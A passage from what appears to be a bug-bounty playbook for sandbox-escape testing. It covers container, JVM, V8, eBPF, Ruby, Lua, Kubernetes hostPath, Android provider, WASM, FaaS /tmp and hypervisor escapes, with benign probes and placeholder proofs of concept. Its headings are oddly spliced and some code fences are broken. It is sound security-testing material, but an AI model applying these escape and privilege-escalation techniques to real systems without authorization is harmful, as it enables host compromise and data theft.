call). The sink only runs `php -r` on the *tester's* machine (lab confusion).
PHP-FPM `security.limit_extensions` blocking `.php` execution of your upload
(a different, protective control).

**Impact:** Denylist bypass → OS command execution as the web user — most
severe on shared hosting where `disable_functions` was the *only* hardening.
Phrase as "disable_functions bypass on PHP <ver> via `<module/sink>` → code
execution as `<user>`; `<list>` neutralized".

**Remediation:** Never treat `disable_functions` as isolation — run PHP-FPM
workers as a dedicated non-root user under seccomp/container confinement,
remove dangerous extensions (FFI unless required), and patch to a supported
PHP version.

**CWE / OWASP:** CWE-693 / CWE-284 (Improper Access Control); OWASP A05:2021
Security Misconfiguration; OWASP A03:2021 where an injection sink feeds it.

## [Bugbountyskills.md] read-only and read a marker file YOU placed there — never copy data out

```

**Confirm:** Two signals: decoded capability/config evidence (what makes the
breakout possible) *plus* a host-scope behavior (host-only artifact read in
lab, or socket API answering with host `docker version`) — reproduced twice.

**False positives:** `.dockerenv` also appears in systemd-nspawn/lxc-style
sandboxing (presence alone proves little). Full `CapEff` inside a *user
namespace* where the mapping is unprivileged — decode the map, don't assume
host root. A docker.sock mounted **read-only** is unusable (socket I/O
needs write — juniors report this as critical; test before claiming).
cgroup v2 without release_agent semantics ≠ the release_agent escape. A
mounted host *log* directory is often intentional (hygiene note, not
breakout) unless it enables writes to host-executed paths.

**Impact:** Container → host root, cross-container compromise on the node,
cluster node takeover (pair with V-10). Phrase as "container with
`<caps/mounts>` on kernel `<ver>` → host compromise path; benign proof:
host-marker read". Severity follows the lowest common denominator of config.

**Remediation:** No `--privileged`, drop all then add only needed caps, never
mount docker.sock, default-deny seccomp + AppArmor, patch kernel and runc
per distro advisory, run workloads rootless/with user namespaces.

**CWE / OWASP:** CWE-250 (Execution with Unnecessary Privileges), CWE-269
(Improper Privilege Management), CWE-1326 (Missing Immutable Root File
System); OWASP A05:2021 Security Misconfiguration.

## [Bugbountyskills.md] V-05: Java SecurityManager execution bypass via reflection API interception

**Mechanism:** A SecurityManager + policy denies untrusted code file/network/
exec permissions via checks on sensitive API entry points. Historical
bypasses re-enter through surfaces the policy doesn't gate: pre-JPMS
`setAccessible(true)` unwrapping private internals, `doPrivileged` frames in
classpath classes (gadget-style "confused deputy"), `MethodHandles`/
`Unsafe` in older JVMs, or custom class loaders. The violated assumption:
"deny-by-default checks at API boundaries cannot be re-entered from a
privileged frame." Crucial context: the SecurityManager is deprecated and
removed for application use on modern JDKs — many "bypasses" are now just
"the feature is gone."

**Preconditions:**
- Untrusted code executes under an active SecurityManager (plugin/extension
  server, script engine, old app server) — `System.getSecurityManager()`
  non-null
- Old enough JVM (pre-module or with `--add-opens`) for reflection to reach
  JDK internals; a privileged frame or AllPermission class reachable
- Exact JVM version known (`java.version`)

**Detect:**
1. Benign fingerprints: `System.getProperty("java.version")`,
   `Runtime.version()` (9+), and
   `System.getSecurityManager() == null ? "NO-SM" : "SM-ACTIVE"`.
2. Prove the mechanism is engaged: attempt a benign denied operation
   (`new java.io.File("/etc/passwd").exists()`) — a `SecurityException`
   (whose text often leaks the policy source) is the engagement signal; a
   `true/false` result means the SM isn't gating what you assumed.
3. Check reflection surface: whether `setAccessible` works on a JDK-internal
   member from your context — on JDK 17+ modules usually block it; that is a
   dead end and a result, not a failure.
4. Match `java.version` to public SecurityManager-bypass literature (largely
   pre-JDK 9 research) — reproduce public techniques in **lab** only.
5. If the app *claims* sandboxing on JDK 17+ with no SM (Nashorn gone,
   GraalVM sandbox separate): the reportable issue may be "claimed sandbox
   not implemented" — scope accordingly.

**Proof of concept:**
```
lab (version-matched JVM):
System.getProperty("java.version");                 // benign fingerprint
System.getSecurityManager() != null                 // SM engaged?
new java.io.File("/etc/hostname").exists();          // control: expect SecurityException
// benign bypass proof (public technique, lab only): read the marker file
// the policy denies — file CONTENT of a marker you created, nothing else
```

**Confirm:** SM reported active (control op throws `SecurityException`) *and*
a policy-denied but benign operation (marker file read) succeeds reproducibly
— denied-by-policy and performed-anyway are the two orthogonal signals.

**False positives:** SM active but the policy grants the permission anyway
(read the policy before claiming a "bypass"). JDK 17+ where the SM was
removed entirely — a "bypass" claim there is mis-scoped (report the missing
sandbox only if the product claims one). `doPrivileged` used by the
application's own code is not attacker-reachable (prove reach from the
untrusted context). Reflection silently blocked by JPMS (attempt it — don't
assume either way; `InaccessibleObjectException` is the deny signal).

**Impact:** Escaping the intended plugin/script sandbox → file read/write
and command execution inside the JVM process. Phrase as "SecurityManager
bypass on JDK <ver> via `<technique>` → policy-denied operations performed
as the JVM user"; cite the research rather than pasting exploit code.

**Remediation:** Do not build sandboxes on the SecurityManager (deprecated,
JDK JEP 411) — isolate untrusted code in a separate process/container; where
an old JVM must stay, minimal policy, no `--add-opens`, and block
class-loader/method-handle escalation paths.

**CWE / OWASP:** CWE-863 (Incorrect Authorization), CWE-693 (Protection
Mechanism Failure); OWASP A05:2021 Security Misconfiguration.

## [Bugbountyskills.md] V-06: Chromium V8 sandbox evasion via type confusion optimization flaws

**Mechanism:** V8's JIT tiers (Sparkplug/Maglev/TurboFan) speculate on
object maps and eliminate checks; a mis-speculation class (stale map after
transitions, wrong range after bounds narrowing) yields type confusion →
out-of-bounds r/w in the JS heap → renderer RCE — and, historically, a further
step out of the renderer sandbox. The violated assumption: "optimized code
preserves the semantics the interpreter enforced." Note the layering: a JS
engine escape lands in the renderer, which is *itself* sandboxed by Chromium;
host compromise needs the additional renderer-sandbox step — say which layer
your evidence actually proves.

**Preconditions:**
- Attacker JS executes somewhere useful (embedded Chromium, Electron app,
  kiosk browser, headless renderer service — *not* your own local browser)
- Exact Chrome/Electron/V8 version ≤ a range with a public in-the-wild or
  advisory-documented type confusion
- Renderer sandbox still on (its absence is a separate, easier finding)

**Detect:**
1. Fingerprint benignly: `navigator.userAgent` / Client Hints (web-exposed),
   `chrome://version` via the product itself, and for Electron/Node-embedded:
   `process.versions.v8`, `process.versions.electron`. V8 version alone can
   map to a Chrome build; record both.
2. Map the build to advisories: Chrome release blog + NVD + Project Zero
   write-ups for that era. "Check the version, then check the advisory" —
   this variant is almost entirely fingerprinting work; exploitation is lab
   work you inherit from the advisory, never invented.
3. If the product bundles an old Chromium and serves *other users*, outdated-
   engine evidence (version string + advisory + shipped-by-default) is the
   finding; do not need a live crash.
4. Lab-only: run the *public* crash PoC against a version-matched build to
   sanity-check the advisory mapping. A crash is a lead; a confirmed mapping
   needs the advisory's bug class matching your fingerprint.

**Proof of concept:**
```
fingerprint (benign):
  navigator.userAgent / process.versions.v8  → <PLACEHOLDER_V8_VERSION>
  product build                             → <PLACEHOLDER_BUILD>
advisory lookup:
  chrome release notes + NVD for <era> → <CVE_ID> fixed in <FIXED_BUILD>
lab sanity check (your own VM, public PoC): crash/behavior matches advisory class
```

**Confirm:** Version evidence showing the engine is inside the vulnerable
range *and* the advisory's bug class fits (type confusion in the relevant
tier), with the fix build identified. Two channels: UA/version string +
advisory mapping. Lab crash repro is a bonus, not a requirement for a
version-based finding.

**False positives:** UA strings altered by enterprise proxies or UA-reduction
policy (corroborate with Client Hints or an independent endpoint). Electron
version ≠ Chrome version mapping done sloppily (map via Electron's bundled
Chromium table). A generic renderer crash is OOM/other — not type confusion
without the advisory's signature. Exploiting *your own* browser against
yourself is not a finding against the program. Renderer RCE ≠ host escape —
don't claim host compromise from JS-engine evidence alone.

**Impact:** For products shipping embedded Chromium/Electron: outdated
in-the-wild-exploited engine reachable by untrusted content → report as
"renderer RCE chain precondition (CVE-<X> class) via outdated bundled
Chromium <ver>"; severity from content exposure model, not from hypothetical
full-chain drama.

**Remediation:** Upgrade the bundled Chromium/Electron to the fixed build;
keep the renderer sandbox and site isolation enabled (never ship
`--no-sandbox`).

**CWE / OWASP:** CWE-843 (Access of Resource Using Incompatible Type /
type confusion), CWE-1104 (Use of Unmaintained Third-Party Components);
OWASP A06:2021 Vulnerable and Outdated Components.

## [Bugbountyskills.md] V-07: eBPF kernel sandbox escape via verifier logic flaw invalidation

**Mechanism:** The kernel verifier statically proves each eBPF program
memory-safe (pointer types, bounds). Public flaw classes — ALU32 bound
tracking, signed/unsigned confusion, narrowing after `OR`/`AND`, map-value
pointer arithmetic — let a program pass verification yet, at runtime, read
and write kernel memory arbitrarily → LPE. The violated assumption: "accepted
by the verifier = memory-safe at runtime." These flaws were exploited in the
wild (2020–2021 era), which is why version matching matters more than
payload cleverness here.

**Preconditions:**
- Ability to load eBPF programs: `kernel.unprivileged_bpf_disabled=0`
  (mass-exploitable) *or* CAP_BPF/CAP_SYS_ADMIN (container-LPE class)
- Kernel version in a vulnerable range *without distro backport* (backports
  are the #1 trap — see Detect)
- `bpf()` syscall not blocked by seccomp/apparmor

**Detect:**
1. Benign probes: `uname -r`, `cat /proc/sys/kernel/unprivileged_bpf_disabled`,
   `ls /sys/fs/bpf 2>/dev/null`, `id` (do you hold CAP_BPF/CAP_SYS_ADMIN?).
   `2` means disabled-unless-CAP_BPF, `1`/`-1` means closed for unprivileged.
2. Classify reach: unprivileged → anyone-on-host LPE; CAP_BPF-only →
   container→host class (still serious; pair with V-04).
3. **Backport check:** map `uname -r` through the *distro's* advisory pages
   (Ubuntu/Debian/RHEL kernel changelogs) — a 5.11-based RHEL kernel may
   already carry the fix. Vanilla upstream ranges are a lead until the
   changelog confirms.
4. Lab-only validation: load the *public* PoC against a version-matched
   vanilla kernel VM; the benign proof rung is a uid differential
   (`id` before/after) on your own VM. Never fuzz or PoC against a shared
   production kernel — verifier bugs crash the host.

**Proof of concept:**
```

## [Bugbountyskills.md] lab-only (your version-matched kernel VM):

$ <PUBLIC_POC_FROM_ADVISORY> && id                              # uid differential = benign proof
```

**Confirm:** Kernel fingerprint inside the vulnerable range *plus* the load
surface actually open (`unprivileged_bpf_disabled=0` or CAP_BPF held) — and
in lab, the public PoC's benign uid proof on a version-matched kernel.
Two channels: version+changelog evidence, surface evidence.

**False positives:** `unprivileged_bpf_disabled=1` and no CAP_BPF — surface
closed, not a finding (the CVE existing elsewhere doesn't matter). Distro
backport makes the vanilla range wrong (the most common mis-triage in this
class). Container holding CAP_BPF on a *patched* kernel is a config hygiene
issue, not an LPE. Classic BPF socket filters (cBPF) are a different
mechanism — verifier flaw research is eBPF-specific. `bpf()` returning
EPERM means seccomp/blocked, not vulnerable.

**Impact:** Unprivileged local user → kernel memory R/W → root LPE; in
containers: breakout to host kernel. Phrase as "kernel <ver> + unprivileged
bpf enabled → LPE per <advisory>, surface confirmed by `<sysctl>`"; severity
Critical when unprivileged.

**Remediation:** Set `kernel.unprivileged_bpf_disabled=1` (or 2 with strict
caps), drop CAP_BPF/SYS_ADMIN from workloads, patch to the distro-fixed
kernel, seccomp-deny `bpf()` where unused.

**CWE / OWASP:** CWE-190 (Integer Overflow / bounds tracking) / CWE-787
(Out-of-bounds Write), CWE-250; OWASP A05:2021 Security Misconfiguration.

## [Bugbountyskills.md] V-08: Ruby $SAFE sandbox circumvention via vulnerable core method clones

**Mechanism:** `$SAFE` levels plus taint/trust tried to confine untrusted
code by gating dangerous operations on tainted/trusted objects. Historical
bypasses lived in core methods that mishandled taint propagation — objects
created, cloned, or replaced without carrying the taint bit or safe-level
check (IO/`Kernel` paths, `Marshal`-adjacent reconstructions, default-proc
and struct tricks across 1.8/1.9-era research). The violated assumption:
"marking data unsafe and checking it at call sites contains code." Ruby's
own maintainers stated `$SAFE` is not a security mechanism — and modern
Rubies removed `$SAFE` (3.0) and taint entirely (3.2), so this variant
exists almost entirely on legacy stacks.

**Preconditions:**
- Legacy app evals untrusted code with `$SAFE` raised (DRb-era apps, old
  template systems, "safe eval" wrappers)
- `RUBY_VERSION` < 3.0 (else the mechanism doesn't exist — see False
  positives) and a core-method bypass matching that version is public
- Underlying OS confinement absent (no container/limits below the interpreter)

**Detect:**
1. Benign fingerprint: `RUBY_VERSION`, `RUBY_ENGINE`, and mechanism presence:
   `$SAFE` (on 3.x this raises `NameError` — itself a useful result: the
   legacy sandbox code is dead but may still *believe* it is protecting).
2. Prove the mechanism engages: at the raised level, attempt a benign op the
   level gates — expect `SecurityError`. Engagement evidence is half your
   confirmation; without it there is nothing to "escape".
3. Map `RUBY_VERSION` to published `$SAFE`-bypass research/CVEs for that
   era; reproduce public techniques only in **lab** on a version-matched
   Ruby.
4. Check below the interpreter (container? rlimit? user?) — severity
   depends on the OS layer, same as V-02.

**Proof of concept:**
```
RUBY_VERSION                       # benign fingerprint → <PLACEHOLDER_RUBY_VERSION>
$SAFE rescue 'removed'             # mechanism presence (3.x: "removed")
File.exist?('/tmp/<MARKER>') rescue $!   # control: SecurityError proves gating active

## [Bugbountyskills.md] lab only: <PUBLIC_BYPASS_FROM_RESEARCH> → benign proof: read marker file / puts `id`

```

**Confirm:** Control operation raising `SecurityError` (mechanism active) +
a policy-denied-but-benign operation succeeding through the bypass class,
reproduced twice in lab; on the live target, engagement evidence +
version-to-research mapping is the honest evidence tier.

**False positives:** On Ruby ≥ 3.0 there is no `$SAFE` — "escaping" it is
meaningless; the reportable issue, if any, is obsolete sandbox *reliance* in
dead code or a plain eval RCE (route to `rce-testing`). The app never
raised `$SAFE` at all (again: plain RCE, not this variant). Taint behavior
differed between 1.8 and 1.9+ (match research to the exact series).
`SecurityError` for an operation that is denied *by the bypass target too*
proves nothing — the differential must be denied-control vs succeeded-
through-bypass.

**Impact:** Untrusted script → arbitrary Ruby → OS execution as the app
user; typical of long-lived legacy services that can't be upgraded
casually. Phrase as "$SAFE level <N> circumvention on Ruby <ver> via
`<method-class>` → code execution as `<user>`; OS layer: `<container/no>`".

**Remediation:** Remove reliance on `$SAFE` (gone in 3.x) — run untrusted
code in a separate non-root process/container; upgrade the interpreter.

**CWE / OWASP:** CWE-693 (Protection Mechanism Failure), CWE-94 (Eval
Injection); OWASP A03:2021 Injection / A06:2021 Vulnerable and Outdated
Components.

## [Bugbountyskills.md] >> sandbox-escape-testing — variants-2.md (variant playbook)

*Source: `/root/Myskill/sandbox-escape-testing/references/variants-2.md`*

## [Bugbountyskills.md] Sandbox Escape Variants — Part 2 (V-09 … V-15)

Deep playbook sections for variants 9-15. Same discipline as part 1:
fingerprint with benign probes, match versions to public advisories,
reproduce public PoCs only in your own lab against version-matched clones,
and check **False positives** before writing anything up.

## [Bugbountyskills.md] Table of contents

- [V-09: Lua sandbox evasion via bytecode manipulation and arbitrary memory writes](#v-09-lua-sandbox-evasion-via-bytecode-manipulation-and-arbitrary-memory-writes)
- [V-10: Kubernetes pod escape via HostPath volume mount exploitations](#v-10-kubernetes-pod-escape-via-hostpath-volume-mount-exploitations)
- [V-11: Windows sandbox escape via RPC interface exploitation and token impersonation](#v-11-windows-sandbox-escape-via-rpc-interface-exploitation-and-token-impersonation)
- [V-12: Android app sandbox evasion via insecure content providers data leakage](#v-12-android-app-sandbox-evasion-via-insecure-content-providers-data-leakage)
- [V-13: WebAssembly linear memory escape via integer overflow sinks](#v-13-webassembly-linear-memory-escape-via-integer-overflow-sinks)
- [V-14: Serverless FaaS environment persistence via writable /tmp code hijacking](#v-14-serverless-faas-environment-persistence-via-writable-tmp-code-hijacking)
- [V-15: Virtual machine hypervisor escape via vulnerable emulated hardware driver IOCTLs](#v-15-virtual-machine-hypervisor-escape-via-vulnerable-emulated-hardware-driver-ioctls)

## [Bugbountyskills.md] V-09: Lua sandbox evasion via bytecode manipulation and arbitrary memory writes

**Mechanism:** Lua's loader trusts precompiled bytecode — the official docs
say undumps are for *trusted* files. Malformed bytecode (inconsistent
constants, prototype counts, upvalue descriptors) corrupts interpreter
internals while staying "valid enough" to pass light checks, giving
arbitrary address r/w from pure Lua — enough to overwrite a function pointer
or forge objects and escape sandboxes that removed `io`/`os`/C access but
still load attacker bytecode. The violated assumption: "an interpreter-level
sandbox (no OS libraries) contains untrusted code" while `load`,
`string.dump`, the `debug` library, or LuaJIT `ffi` remain reachable.

**Preconditions:**
- Attacker supplies Lua code *or bytecode* (game mods, config scripts, wire
  protocol, embedded automation)
- `load`/`loadstring` reachable and the loader accepts bytecode; or
  `debug`/`ffi` present (those are near-instant escape classes, report first)
- Exact Lua/LuaJIT version known (`_VERSION`, `jit.version`)

**Detect:**
1. Benign fingerprints: `print(_VERSION)` (`Lua 5.x`), and for LuaJIT
   `print(jit and jit.version)`. Version mismatch between the dumper and
   loader runtimes is itself a fingerprint (5.3 dumps fail on 5.4 — the error
   text leaks versions).
2. Surface inventory (all benign): `type(load)`, `type(string.dump)`,
   `type(debug)`, `type(ffi)`. `ffi` present = the sandbox is decorative;
   `debug` present often is too. Report what exists before digging deeper.
3. Bytecode acceptance test: `assert(load(string.dump(function() return 42
   end)))() == 42` — a `42` means untrusted bytecode is loadable (the whole
   variant's precondition confirmed); an error means the door is shut.
4. Match `_VERSION`/`jit.version` to public bytecode-corruption research and
   write-ups (prevalent for 5.1/LuaJIT eras); reproduce public PoCs only in
   **lab** on a version-matched interpreter — these crash or corrupt memory.

**Proof of concept:**
```
benign probes:
  print(_VERSION)                                     → <PLACEHOLDER_LUA_VERSION>
  print(jit and jit.version)                          → <PLACEHOLDER_LUAJIT_V>
  print(type(load), type(string.dump), type(debug), type(ffi))
  assert(load(string.dump(function() return 42 end)))()   → 42 = bytecode accepted
lab only: <PUBLIC_BYTECODE_POC> → benign proof: contents of a marker file you created
```

**Confirm:** Bytecode roundtrip returning `42` (loader trusts dumps) plus,
in lab, a public-PoC benign marker read on a version-matched interpreter.
On the live target the honest tier is: bytecode accepted + version-to-
research mapping + no OS layer beneath.

**False positives:** Attacker-supplied *source text* executing inside the
sandbox is not an escape — that's the sandbox working as designed; only
leaving the intended capability set counts. `luac` version mismatch errors
are fingerprints, not findings. Memory-corruption claims without a lab repro
on the exact version are theory — do not report them as confirmed. `ffi`
present but `ffi.cdef`/`ffi.load` restricted via `__index` metatable tricks —
test the actual denial before claiming either side.

**Impact:** Sandboxed script → arbitrary process memory r/w → RCE in the
host app (games, firmware, CDN/WAF Lua platforms, serverless Lua).
Phrase as "untrusted bytecode accepted on Lua <ver> → memory corruption
class per `<research>` → process RCE; OS layer: `<container/no>`".

**Remediation:** Never load untrusted bytecode — accept text source only,
strip `string.dump`, remove `load`, and delete `debug`/`ffi` from the
sandbox; run untrusted Lua in a separate process with OS limits.

**CWE / OWASP:** CWE-502-adjacent untrusted deserialization of bytecode
(CWE-502), CWE-125/787 (OOB read/write); OWASP A03:2021 Injection.

## [Bugbountyskills.md] V-10: Kubernetes pod escape via HostPath volume mount exploitations

**Mechanism:** `hostPath` volumes pierce pod isolation by mounting host
filesystem paths inside the container. Whoever can create or edit pods —
over-broad RBAC, a compromised CI service account, a permissive dashboard,
missing admission policy — can mount `/`, `/var/lib/kubelet`, `/etc`, or
container-socket paths and thereby read/write host files: other tenants'
secrets, pod specs, service account tokens, host cron/`rc.local`-class
persistence. The violated assumption: "Kubernetes namespaces isolate
tenants" when volumes cross the node boundary.

**Preconditions:**
- Either: ability to create/edit pods (or `podsecurity`-bypassing workloads),
  or: already running in a pod that mounts a hostPath (recon from inside)
- No PSA "restricted" enforcement / OPA-Kyverno deny for hostPath
- Node-level consequence path (writeable host path or token-readable path)

**Detect:**
1. In-pod recon (benign): `cat /proc/mounts | grep -Ev 'proc|sysfs|cgroup|
   overlay|tmpfs'`, `ls /var/lib/kubelet/pods 2>/dev/null`,
   `ls /var/run/secrets/kubernetes.io/serviceaccount`, `id`, `hostname`.
2. API-side capability (benign): `kubectl auth can-i create pods -n <NS>`,
   `kubectl auth can-i list pods --all-namespaces`,
   `kubectl get ns -o jsonpath='{.items[*].metadata.annotations.pod-security\.kubernetes\.io/enforce}'`
   — the enforce label tells you whether policy would block your PoC.
3. If pod creation is possible: send a **read-only** hostPath pod spec (see
   PoC) in lab or an authorized staging cluster; on production, capability
   evidence + any existing dangerous mount is the honest evidence tier.
4. Version check: `kubectl version` / API `/version` (benign) against kubelet
   /node advisories too — but note most HostPath findings are *misconfig*,
   not CVEs.

**Proof of concept:**
```

## [Bugbountyskills.md] benign capability proof

kubectl auth can-i create pods -n <PLACEHOLDER_NAMESPACE>          → yes/no
kubectl auth can-i list secrets --all-namespaces                   → yes/no

## [Bugbountyskills.md] lab/staging: minimal read-only hostPath pod

spec:
  volumes: [{ name: h, hostPath: { path: /, type: Directory } }]
  containers: [{ name: c, image: <PLACEHOLDER_IMAGE>,
                 volumeMounts: [{ name: h, mountPath: /host, readOnly: true }] }]

## [Bugbountyskills.md] benign in-pod proof: diff /host/etc/hostname vs ./hostname, or read a

## [Bugbountyskills.md] marker file you placed on the node — nothing else

```

**Confirm:** Two signals: RBAC/policy evidence (`can-i` result + enforce
label) *and* host-scope data (host-only file content read in lab, hostname
differential) — reproduced twice. On production, `can-i create pods` + an
already-mounted dangerous path also qualifies.

**False positives:** HostPath of `/var/log` or `/etc/hosts` for telemetry is
often intentional — report as over-broad hygiene unless it enables host
writes or token reads (scope honestly). Overlay on `/` in `/proc/mounts` is
the normal container filesystem, not the host. PSA enforcing `restricted`
blocks hostPath — check the enforce label before claiming exploitability.
Reading *pod-namespace* secrets via the mounted service account is normal
RBAC behavior, not an escape — the finding is the volume or the RBAC grant,
whichever is the actual flaw. One compromised node ≠ whole cluster — say so.

**Impact:** "Pod with `<SA>` can mount the node filesystem → node root,
cross-namespace secret read on node `<name>`, cluster-takeover path via
scheduling/token abuse." Severity: High/Critical depending on whether
cluster-admin tokens or other tenants sit behind it.

**Remediation:** Enforce PSA `restricted` (or admission-deny hostPath and
escalation verbs), scope RBAC so untrusted SAs cannot create/edit pods, and
isolate tenant workloads per node/pool.

**CWE / OWASP:** CWE-250 (Execution with Unnecessary Privileges), CWE-269
(Improper Privilege Management), CWE-284; OWASP A05:2021 Security
Misconfiguration.

## [Bugbountyskills.md] NT AUTHORITY\SYSTEM once, then stop — no persistence, no new accounts

```

**Confirm:** Privilege list + build fingerprint + service state (channel one)
and, in lab, the public technique producing a single benign `whoami`
elevation on a version-matched build (channel two). For RPC-specific CVEs,
also show the patched/unpatched differential by build/KB.

**False positives:** `SeImpersonatePrivilege` on a service account is
*normal configuration* — it is the precondition, not the bug; reports that
equate the two get rejected. TCP 135 open is default exposure, not a
vulnerability — an *abusable* interface needs missing auth on a specific
service. Technique failing on target does not prove safety elsewhere (and
do not keep pushing — destructive boundary). 32-bit vs 64-bit tooling
mismatches produce fake "non-vulnerable" results. A SYSTEM `whoami` from
*your lab VM* pasted as target evidence is fraud, not proof — label lab
results as lab.

**Impact:** Local privilege escalation to SYSTEM / service-account
takeover; RPC-class issues may be network-local or remote. Phrase as
"`<user>` + `<privilege>` → SYSTEM on build `<N>` (technique class per
`<advisory/tool>`); lab-reproduced on matching build" — with the starting
privilege stated.

**Remediation:** Strip unneeded privileges from service accounts, apply the
build's KB patch for RPC-class CVEs, firewall RPC surfaces to needed
transports only, disable unused services (e.g. spooler where not needed).

**CWE / OWASP:** CWE-269 (Improper Privilege Management), CWE-306 (Missing
Authentication for Critical Function); OWASP A01:2021 Broken Access Control.

## [Bugbountyskills.md] V-12: Android app sandbox evasion via insecure content providers data leakage

**Mechanism:** `ContentProvider`s pierce the app sandbox by design. A
provider declared `android:exported="true"` without a (signature-level)
permission — or with `grantUriPermissions`/`path-permission` gaps, or SQL
`selection` built by string concatenation — lets any installed app (or adb
shell) read or write the app's private database/files. The violated
assumption: "app-private storage stays private" once the provider boundary
is mis-gated.

**Preconditions:**
- APK obtainable (store, MDM, leaked build) for static analysis
- A provider exported (or exportable via intent filter) without an enforced
  signature permission; `normal`/`dangerous` protection-level custom
  permissions are bypassable by *any* app that requests them — the classic
  junior miss
- Device/lab access for dynamic probes (unprivileged third-party app or adb)

**Detect:**
1. Static: `apkanalyzer manifest print <PLACEHOLDER_APK>` or
   `aapt dump xmltree <PLACEHOLDER_APK> AndroidManifest.xml`; enumerate every
   `<provider>`: `android:exported`, `android:permission`,
   `readPermission`/`writePermission`, `grantUriPermissions`,
   `android:authorities`, `<path-permission>` entries.
2. Judge the permission model: missing permission, or a custom permission
   with `protectionLevel` below `signature` → bypassable. `signature` →
   likely fine (verify enforcement dynamically).
3. Dynamic, benign: `adb shell content query --uri
   content://<PLACEHOLDER_AUTHORITY>/<PLACEHOLDER_PATH> --projection <BENIGN_COL>`
   — record **row counts and column schema only**, never data rows.
4. SQL injection in `selection`: row-count differential
   `--where "1=1"` vs `--where "1=2"` — count-only evidence.
5. FileProvider paths: probe `content://<AUTHORITY>/../../...` style paths
   for traversal — benign: attempt to list a *mapped root*, don't exfiltrate.

**Proof of concept:**
```
adb shell content query --uri content://<PLACEHOLDER_AUTHORITY> \
  --projection <PLACEHOLDER_BENIGN_COLUMN> | wc -l            # count only
row-count differential: --where "1=1" vs --where "1=2"        # injection signal

## [Bugbountyskills.md] V-13: WebAssembly linear memory escape via integer overflow sinks

**Mechanism:** WASM linear memory is bounds-checked *by the engine* — OOB
inside it traps and stays sandboxed. "Escaping" therefore means the buggy
layer is somewhere else: host glue (JS/Go/Rust wrappers) computing
`ptr + len` in wrapping 32-bit arithmetic and slicing `TypedArray`s out of
bounds, missing checks on `memory.copy`/`memory.fill`/`memory.init`
operands, or a historical engine validator bug. The violated assumption:
"every length the guest supplies is re-checked with overflow-safe math at
the host boundary" — the wrapper, not the guest, is usually where the
integer overflow lives.

**Preconditions:**
- Attacker influences WASM input sizes/offsets (document/image/media
  decoders compiled to WASM are the classic hosts)
- A wrapper doing manual `ptr+len` math, or an engine version with a public
  validator/runtime advisory (wasmtime/wasmer/wasm-micro-runtime publish
  GHSAs — check version)

**Detect:**
1. Fingerprint benignly: WASM present (`\0asm` module magic, `WebAssembly`
   global in JS hosts, `wasmtime --version`/`wasmer --version` on hosts
   where visible); engine + version feeds the advisory check.
2. Differential probes (benign, from the public API): invoke with
   `(ptr=0, len=<LARGE>)` — expect a clean trap ("out of bounds"); then
   `(ptr=<N>, len=2**32 - N + 1)` — the wrapping case. Record the *differential*:
   trap (correct) vs host-side exception vs silent accept (lead).
3. If source is available (open-source host glue, leaked source): grep for
   `ptr + len`, `offset + size` slicing without checked-add — a lead to
   prioritize, not a finding by itself.
4. Match engine version to GHSA/NVD; public PoCs reproduce in **lab** only.

**Proof of concept:**
```
invoke <PLACEHOLDER_FUNC>(ptr=0, len=<PLACEHOLDER_LARGE>)        →  trap (expected)
invoke <PLACEHOLDER_FUNC>(ptr=<N>, len=2**32 - N + 1)            →  observe differential:
     trap   = correct behavior (no finding)
     silent accept / host TypeError / neighboring data returned  = lead → lab
lab only: <PUBLIC_ENGINE_POC> → benign proof: marker bytes read from an
     adjacent allocation — never host-process data
```

**Confirm:** Data from a *different* object's allocation returned through
the wrapped length (proves real OOB, not a wrap-to-zero no-op), reproduced
twice; or, for engine-CVE findings: version ≤ vulnerable range + advisory +
surface reachable.

**False positives:** `i32.wrap` semantics are *defined* — wrapping is only a
bug if the wrapped value is then trusted as a length (check the code path
before claiming). Engine traps on OOB are correct behavior, not findings.
The biggest junior mistake: "WASM memory corruption" claimed from linear-
memory OOB alone — that stays inside the sandbox by design; the finding
requires the *host/validator* to be the buggy layer, and the report must say
which layer. OOM/allocation-failure ≠ OOB.

**Impact:** Host wrapper or engine bug → OOB r/w in the host process → RCE
in apps using the WASM component (document processors are pre-auth-shaped
attack surface). Phrase by layer: "integer overflow in host wrapper
(`<file:line>`) → OOB read of adjacent allocations" vs "engine CVE-<X>
class on `<engine> <ver>`".

**Remediation:** Overflow-safe bounds (checked add) on every `ptr+len`
before slicing; validate guest lengths at the boundary; upgrade the engine
per its advisory.

**CWE / OWASP:** CWE-190 (Integer Overflow), CWE-125/787 (OOB read/write);
OWASP A03:2021 Injection / A06:2021 Vulnerable and Outdated Components.

## [Bugbountyskills.md] V-14: Serverless FaaS environment persistence via writable /tmp code hijacking

**Mechanism:** FaaS platforms reuse warm execution environments across
invocations. Anything writable inside the instance — `/tmp` (Lambda,
Cloud Functions tmpfs), and worse: env-var mutations made in-process —
survives into the *next* invocation of the same instance. An attacker with
one-shot code execution (upload handler, injection sink) who can write to a
path later consulted at import/startup (Python `.pth`/`sitecustomize` on
`sys.path`, Node `require` resolution into writable dirs, modified
dependency caches) turns a transient injection into persistent, cross-
invocation code execution. The violated assumption: "each invocation is a
fresh isolate."

**Preconditions:**
- One write primitive during an invocation (even file-write-only helps)
- The platform reuses instances (Lambda does per function+account; check the
  provider's documented reuse behavior)
- A load path consulting writable dirs (`sys.path` includes `/tmp`,
  `NODE_PATH`, cwd-based imports) — *detect*, don't assume

**Detect:**
1. Persistence probe (benign, the core test): invocation A writes
   `/tmp/<MARKER>` containing a unique token + timestamp; invocation B
   (separate request, unique token) reads it back. Present across two
   requests = warm reuse confirmed.
2. Surface read (benign): Python `print(sys.path, os.getcwd())`, Node
   `console.log(require.main.paths, process.cwd(), process.env.NODE_PATH)`,
   env listing with `os.environ`/`process.env` — find what imports consult
   and whether `/tmp` or cwd is on it.
3. Warm-pool evidence: identical marker contents + timing gaps show same
   instance; require at least two successful round-trips before claiming
   reuse (the platform may interleave cold starts).
4. Hijack candidates: identify (read-only) the first import that resolves
   after `/tmp` on the path — the *lab* proof rung is a benign module that
   only prints a marker when imported.

**Proof of concept:**
```
invocation A:  write /tmp/<MARKER> = <TOKEN_A + timestamp>     # benign
invocation B:  read  /tmp/<MARKER> → <TOKEN_A>                  # persistence proof

## [Bugbountyskills.md] lab only: drop a benign module printing a marker on import into the

## [Bugbountyskills.md] first writable import path; observe the marker in a later invocation

## [Bugbountyskills.md] V-15: Virtual machine hypervisor escape via vulnerable emulated hardware driver IOCTLs

**Mechanism:** Guests reach host-side emulation through device interfaces:
virtio devices (ring buffers, config space), VirtualBox guest-driver IOCTLs
(`DeviceIoControl` on `\\.\VBoxDrv`-class devices, shared folders/clipboard
providers), VMware backdoor I/O, guest-AGT channels. Bugs in the *host's*
